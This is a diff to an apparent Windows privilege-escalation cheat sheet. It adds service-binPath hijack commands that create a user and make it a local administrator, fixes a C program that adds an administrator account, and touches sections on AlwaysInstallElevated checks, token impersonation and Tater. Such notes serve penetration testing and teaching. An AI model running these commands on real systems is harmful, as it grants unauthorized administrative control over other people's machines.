@@ -400,8 +400,15 @@ WRITE_OWNER / WO
 To alter the service configuration:
 
 ```
-sc config <SERVICENAME> binPath=net localgroup administrators <USERNAME> /add
-sc config <SERVICENAME> binPath=<NEWBINPATH>
+# A space is required after binPath=
+sc config <SERVICE_NAME> binPath= "net user <USERNAME> <PASSWORD> /add"
+sc config <SERVICE_NAME> binPath= "net localgroup administrators <USERNAME> /add"
+sc config <SERVICE_NAME> binPath= "<NEW_BIN_PATH>"
+
+# If needed, start the service under Local Service account
+sc config <SERVICE_NAME> obj= ".\LocalSystem" password= ""
+sc config <SERVICE_NAME> obj= "\Local Service" password= ""
+sc config <SERVICE_NAME> obj="NT AUTHORITY\LocalService" password= ""
 ```
 
 The `Metasploit` module `exploit/windows/local/service_permissions` can be used
@@ -479,8 +486,8 @@ The following C code can be used to add a local administrator user:
 
 int main() {
   int i;
-  i = system("net user TMP_Account <PASSWORD> /add")
-  i = system("net localgroup administrators TMP_Account /add")
+  i = system("net user <USERNAME> <PASSWORD> /add");
+  i = system("net localgroup administrators <USERNAME> /add");
   return 0;
 }
 ```
@@ -499,12 +506,19 @@ To restart the service:
 
 ```
 # Stop
-net stop <SERVICE>
-Stop-Service -Name <SERVICE> -Force
+net stop <SERVICE_NAME>
+Stop-Service -Name <SERVICE_NAME> -Force
 
 # Start
-net start <SERVICE>
-Start-Service -Name <SERVICE>
+net start <SERVICE_NAME>
+Start-Service -Name <SERVICE_NAME>
+```
+
+If an error `System error 1068` ("The dependency service or group failed to
+start."), the dependencies can be removed to fix the service:
+
+```
+sc config <SERVICE_NAME> depend= ""
 ```
 
 ### AlwaysInstallElevated policy
@@ -527,7 +541,6 @@ host be querying the registry:
 # If not, the error message "ERROR: The system was unable to find the specified registry key or value." indicates that the policy is not set
 
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-Get-RegistryAlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
 # (PowerShell) PowerSploit's PowerUp Get-RegistryAlwaysInstallElevated
@@ -618,7 +631,8 @@ meterpreter > impersonate_token 'NT AUTHORITY\SYSTEM'
 
 ###### Tater
 
-Tater is a PowerShell implementation of the Hot Potato Windows Privilege Escalation exploit.
+Tater is a PowerShell implementation of the Hot Potato Windows Privilege
+Escalation exploit.
 
 ```
 # Import module (Import-Module or dot source method)
